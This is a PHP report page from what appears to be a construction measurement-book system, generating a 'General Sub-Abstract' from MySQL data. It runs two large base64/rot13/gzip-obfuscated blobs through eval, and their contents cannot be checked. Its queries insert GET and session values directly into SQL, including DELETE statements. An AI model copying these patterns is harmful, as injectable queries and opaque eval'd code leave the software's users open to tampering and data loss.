<?php
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
include "library/common.php";
include "sysdate.php";
checkUser();
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
$msg = '';
$newmbookno='';
$staffid = $_SESSION['sid'];
$userid = $_SESSION['userid'];
$mbooktype = "G";
function dt_format($ddmmyyyy) {
    $dt = explode('/', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function dt_display($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[2];
    $mm = $dt[1];
    $yy = $dt[0];
    return $dd . '/' . $mm . '/' . $yy;
}
function getWordWrapCount($description,$char)
{
	$wrap_cnt 	= 0; 
	$descwork 	= "";
	$char_no 	= $char;
	$work_desc 	= $description;
	$desc 		= wordwrap($work_desc,$char_no,'<br>');
	$exp_line 	= explode('<br>', $desc);
	$wlcnt 		= count($exp_line);
	for($xc=0; $xc<$wlcnt; $xc++)
	{
		if($exp_line[$xc] != "")
		{
			$wrap_cnt++;
			$descwork .= $exp_line[$xc]."<br/> ";
		}
	}
	return array($descwork, $wrap_cnt);
}
function check_line($title,$table,$page,$mbookno,$newmbookno,$table1)
{
	if($page == 100) { $mbookno = $newmbookno; }
	$row = '<tr style="border-style:none;"><td style="border-style:none;" colspan="9" align="center">&nbsp;<br/>Page '.$page.'&nbsp;&nbsp</td></tr>';
	$row = $row."</table>";
	$row = $row."<p  style='page-break-after:always;'></p>";
	$row = $row.'<table width="875" border="0"  cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF" style="border:none;" class="label">
			<tr style="border:none;"><td align="center" style="border:none;">General M.Book No. '.$mbookno.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
			</table>';
	$row = $row.$table;
	$row = $row.'<table width="875" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF"  class="label">';
	$row = $row.$table1;
	echo $row;
}

/*if($_POST["Back"] == " Back ")
{
     header('Location: Generate_Composite.php');
}*/
$sheetid		=	$_SESSION["sheet_id"]; 
$fromdate 		= 	$_SESSION['fromdate'];
$todate 		= 	$_SESSION['todate'];
$mbookno 		= 	$_SESSION["mb_no"];    
$mpage 			= 	$_SESSION["mb_page"];
$mbno_id 		= 	$_SESSION["mbno_id"];
$rbn 			= 	$_SESSION["rbn"];
$abstmbookno 	= 	$_SESSION["abs_mbno"];
$oldmbookno 	=	$mbookno;
$oldmbookpage 	=	$mpage;
$query 			= "SELECT * FROM sheet WHERE sheet_id ='$sheetid' ";
$sqlquery 		= mysql_query($query);
if ($sqlquery == true) 
{
    $List 				= 	mysql_fetch_object($sqlquery);
    $work_name 			= 	$List->work_name;    
	$tech_sanction 		= 	$List->tech_sanction;
    $name_contractor 	= 	$List->name_contractor;    
	$agree_no 			= 	$List->agree_no; 
	$work_order_no 		= 	$List->work_order_no; 
	$ccno 				= 	$List->computer_code_no;
	$section_type		=   $List->section_type;
    //if($List->rbn  ==0) { $runn_acc_bill_no =1;  } else { $runn_acc_bill_no =$List->rbn + 1;}
	$runn_acc_bill_no 	= $rbn;
    $_SESSION["currentrbn"]	=	$runn_acc_bill_no;
}
$UsedMBArr[$mbookno][0] = $mpage;
$length 		= 	strlen($work_name);
//echo $length."<br/>";
$start_line 	= 	ceil($length/87);
//echo $start_line;

$DeleteMbGenerateQuery	=  "DELETE FROM mbookgenerate WHERE sheetid = '$sheetid'";
$DeleteMbGenerateSql 	=  mysql_query($DeleteMbGenerateQuery);
$DeleteMbookTempQuery 	=  "DELETE FROM measurementbook_temp WHERE sheetid = '$sheetid'";
$DeleteMbookTempSql 	=  mysql_query($DeleteMbookTempQuery);

if($section_type == 'III'){
	$DeletePPaymentQuery 	=  "DELETE FROM pp_qty_splt WHERE sheetid = '$sheetid' and rbn = '$rbn'";
	$DeletePPaymentSql 		=  mysql_query($DeletePPaymentQuery);
	$UpdateMBdetailQuery 	=  "UPDATE mbookheader a, mbookdetail b set b.curr_paid_perc = '', b.curr_paid_rbn = '', b.curr_parent_id = '' WHERE a.mbheaderid = b.mbheaderid and a.sheetid = '$sheetid' and b.curr_paid_rbn = '$rbn'";
	$UpdateMBdetailSql 		=  mysql_query($UpdateMBdetailQuery);
}

if($_GET['varid'] == 1)
{
	$deletequery=mysql_query("DELETE FROM oldmbook WHERE sheetid = '$sheetid' AND mbook_type = 'G'");
}
function mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$mpage,$contentarea,$abstmbookno,$rbn,$userid)
{ 
   $querys="INSERT INTO mbookgenerate set sheetid='$sheetid',divid='$prev_divid',subdivid='$prev_subdivid',
       fromdate ='$fromdate',todate ='$todate' ,mbno='$mbookno',flag=1,rbn='$rbn', abstmbookno = '$abstmbookno',
            mbgeneratedate=NOW(), staffid='$staffid', mbpage='$mpage', mbtotal='$contentarea', active=1, userid='$userid', is_finalbill = '".$_SESSION["final_bill"]."'";
 //echo $querys."<br>";
   $sqlquerys = mysql_query($querys);
}
if($_GET['newmbook'] != "")
{
$newmbookno 		= 	$_GET['newmbook'];
$newmbookpage_query = 	"select mbpage, allotmentid from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$newmbookno'";
$newmbookpage_sql 	= 	mysql_query($newmbookpage_query);
$newmbookpage 		= 	@mysql_result($newmbookpage_sql,0,'mbpage');
}
function stafflist($subdivid,$date,$sheetid)
{
	$date 				= 	dt_format($date);
	$staff_design_sql 	= 	"select  DISTINCT staff.staffname, designation.designationname, mbookheader.date from staff 
	INNER JOIN designation ON (designation.designationid = staff.designationid) 
	INNER JOIN mbookheader ON (mbookheader.staffid = staff.staffid)
	WHERE staff.staffid = mbookheader.staffid AND staff.active = 1 AND designation.active = 1 AND mbookheader.date = '$date' AND mbookheader.sheetid = '$sheetid' AND mbookheader.subdivid = '$subdivid'";
	$staff_design_query = 	mysql_query($staff_design_sql);
	while($staffList = mysql_fetch_object($staff_design_query))
	{
		$staffname 		= 	$staffList->staffname;
		$designation 	= 	$staffList->designationname;
		$result 	   .= 	$staffname."*".$designation."*";
	}
	return rtrim($result,"*");
	//echo $staff_design_sql."<br/";
}
function getabstractpage($sheetid,$subdivid)
{
	$select_abs_page_query 	= "select abstmbookno, abstmbpage from measurementbook_temp WHERE sheetid = '$sheetid' AND subdivid = '$subdivid'";
	$select_abs_page_sql 	= mysql_query($select_abs_page_query);
	$abstmbookno 			= @mysql_result($select_abs_page_sql,0,'abstmbookno');
	$abstractpage 			= @mysql_result($select_abs_page_sql,0,'abstmbpage');
	echo "C/o to Page ".$abstractpage." /Abstract MB No. ".$abstmbookno;
}

/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array();
if($_POST["modal_btn_next_mb"] == " NEXT "){
	$NextMBFlag = 1;
	$TotalNoList 	= $_POST['txt_no']; //print_r($TotalNoList);exit;
	rsort($TotalNoList);
	foreach($TotalNoList as $NoKey => $NoValue){ 
		//$UsedMBArr[$MBStartVal][0] = $NextMBPageList[$MBStartKey];
		$SelectMB 		= $_POST['txt_next_mb'.$NoValue]; 
		$SelectMBPage 	= $_POST['txt_next_mbpage'.$NoValue];
		if($SelectMBPage != ''){
			array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
			array_push($NextMBPageList,$SelectMBPage);
			$UsedMBArr[$SelectMB][0] = $SelectMBPage;
		}
		
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>Sub-Abstract M.Book</title>
        <link rel="stylesheet" href="script/font.css" />
</head>
		<!--<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
		<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
		<link rel="stylesheet" href="css/button_style.css"></link>
	 	<link rel="stylesheet" href="js/jquery-ui.css">
	  	<script src="js/jquery-1.10.2.js"></script>
	  	<script src="js/jquery-ui.js"></script>
	  	<link rel="stylesheet" href="/resources/demos/style.css">-->
	<script src="js/jquery-1.10.2.js"></script>
	<link rel="stylesheet" href="css/chosen.min.css">
   	<script src="js/chosen.jquery.min.js"></script>
	<link href="bootstrap-dialog/css/bootstrap-min.css" rel="stylesheet" type="text/css" />
	<script src="bootstrap-dialog/js/bootstrap.min.js"></script> <!---IMP-->
	<link href="bootstrap-dialog/css/bootstrap-dialog.min.css" rel="stylesheet" type="text/css" />
	<script src="bootstrap-dialog/js/bootstrap-dialog.min.js"></script>
<script>
  	/*$(function() {
		$("#dialog").dialog({ autoOpen: false,
        	minHeight: 200,
        	maxHeight:200,
        	minWidth: 300,
        	maxWidth: 300,
        	modal: true,
		});
        $("#dialog").dialog("open");
        $( "#dialog" ).dialog( "option", "draggable", false );
		$('#btn_cancel').click(function(){
			$("#dialog").dialog("close");
			window.location.href="Generate_Composite.php";
		});
        $('#btn').click(function(){
			var x = $('#newmbooklist option:selected').val();
			//alert(x);
			if(x == ""){
				var a="* Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
			}else{
				$("#dialog").dialog("close");       
				var newmbookvalue = $("#newmbooklist option:selected").text(); //alert(newmbookvalue);
				var oldmbookdetails = document.form.txt_mbno_id.value;
				$.post("GetOldMbookNo.php", {oldmbook: oldmbookdetails}, function (data) {
					window.location.href="GeneralMBook_Composite.php?newmbook="+newmbookvalue;
					return false; // avoid to execute the actual submit of the form.
				});
			}
		});
		$.fn.validatenewmbook = function(event){ 
			if($('#newmbooklist option:selected').val()==""){ 
				var a="Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
						//return false;
			}else{
				var a="";
				$('#error_msg').text(a);
			}
		}
		$("#newmbooklist").change(function(event){
			$(this).validatenewmbook(event);
		});
	});*/
	function goBack(){
		url = "Generate_Composite.php";
		window.location.replace(url);
	}
</script>
<style type="text/css" media="print,screen" >
	table{ 
		border-collapse: collapse; 
	}
	td{ 
		border: 1px solid #CACACA;
		padding-top:5px;
		padding-bottom:5px;
	}
	.ui-dialog > .ui-widget-header{
		background: #20b2aa; font-size:12px;
	}
	.breakAfter{
		page-break-before: always;
	}
	.labelcontent{
		font-family:Microsoft New Tai Lue;
		font-size:12pt;
		color:#000000;
	}
	.labelheadblue{
		color:#0000CD;
		font-weight:bold;
		font-size:12px;
	}
	.labelcontentblue{
		color:#0000CD;
		font-weight:bold;
		/*font-size:12pt;	*/
	}
	.label{
		color:#0000CD;
	}
	.title{
		font-family:Verdana, Arial, Helvetica, sans-serif;
		color:#FFFFFF; 
		border:none; 
		font-size:16px;
		font-weight:bold;
	}
	.ui-dialog-titlebar-close{
		visibility: hidden;
	}
	.submit_btn{
		position:absolute;
		border:none;
		top:110px;
		left:80px;
		font-weight:bold;
		font-size:12px;
	}
	.cancel_btn{
		position:absolute;
		border:none;
		top:110px;
		left:160px;
		font-weight:bold;
		font-size:12px;
	}
	.submit_btn:hover{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.cancel_btn:hover{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.textboxcobf{
		width:398px; 
		border:none; 
		text-align:right;
		font-weight:bold;
		color:#0000CD;
	}
	.cobffont{
		font-size:11px;
	}
	.label, .labelcenter, .labelheadblue{
		font-size:13px;
	}
</style>
<script type="text/javascript">
	window.history.forward();
	function noBack() { window.history.forward(); }
</script>
<body bgcolor="#000000" oncontextmenu="return false"onload="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="875" style=" text-align:center; left:198px;" height="56px" align="center" bgcolor="#1babd3" class=''>
	<tr style="position:fixed;">
		<td class="title" width="874" height="56px" align="center" bgcolor="#1babd3">General Sub-Abstract</td>
	</tr>
</table>
<form name="form" id="form" method="post">
			<?php
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ?>
            <?php echo $table2; ?>
<input type="hidden" name="txt_mbno_id" value="<?php echo $mbno_id."*".$mbookno."*"."G"."*".$staffid."*".$sheetid; ?>" id="txt_mbno_id" />
<table width="875" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF" class="label">
<?php echo $table1; ?>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

//echo $mbook_compo_sql;exit;
$mbook_compo_query 	= 	mysql_query($mbook_compo_sql);
if($mbook_compo_query == true)
{
	while($CompoList = mysql_fetch_object($mbook_compo_query))
	{
		//$subdivname 	= 	getsubdivname($CompoList->subdivid);
		//$decimal		=	get_decimal_placed($CompoList->subdivid,$sheetid);
		$ItemData		=	getItemDetails($sheetid,$CompoList->subdivid);
		$ExplodeData	=	explode("##@**@##",$ItemData);
		$subdivname		=	$ExplodeData[0];
		$ItemUnit		=	$ExplodeData[2];
		$decimal		=	$ExplodeData[3];
		$fromdate 		=	$CompoList->fromdate;
		$todate 		=	$CompoList->todate;
		$createDate 	= 	new DateTime($todate);
		$item_flag		=	$CompoList->flag;
		$zone_id		=	$CompoList->zone_id;
		$todate 		= 	$createDate->format('Y-m-d');
		$description1 = getscheduledescription_new($CompoList->subdivid);
				$snotes = $description1;
				$degcelsius = "&#8451";
				$description = str_replace("DEGCEL","$degcelsius",$snotes);
		$zonename = getzonename($sheetid,$zone_id);
		if($zonename != ""){ $zonename = "( ".$zonename." )"; }
		if($page > 100)
		{
			/*if($_GET['varid'] == 1)
			{
			?>
				<div id="dialog" title="Choose MBook No." style="background-color:#f9f8f6;font-size: 12px;">
				<p style="font-size:12px; font-weight:bold; color:#911200;">Select Next MBook Number</p>
				<select id="newmbooklist" name="mb" style="width:275px;">
				<option value="">---------------------Select--------------------</option>
				<?php echo $objBind->BindMBookList($mbookno,$sheetid,$staffid,$mbooktype); ?>
				</select>
				<br/>
				<span id="error_msg" style="color:#FF0000; font-weight:bold;"></span>
				<input type="button" class="submit_btn" id="btn" style="color:#FFFFFF;background-color:#9c27b0;border:none;" name="btn" value="Submit"/>
				<input type="button" class="cancel_btn" id="btn_cancel" style="color:#FFFFFF;background-color:#e51c23;border:none;" name="btn_cancel" value="Cancel"/>
				</div>
				<?php
			}*/
			/*$currentline = $start_line + 7;
			$prevpage = 100;
			$page = $newmbookpage;
			//$prevpage = $mpage;
			//$oldmbookno = $mbookno;
			$mbookno = $newmbookno;*/
		}
		//echo $todate."<br/>";
		if(($pre_subdivid != "") && ($pre_staffid != ""))
		{
			if($pre_subdivid != $CompoList->subdivid)
			{
				$temp = 1;
			}
			/*if($pre_subdivid == $CompoList->subdivid)
			{
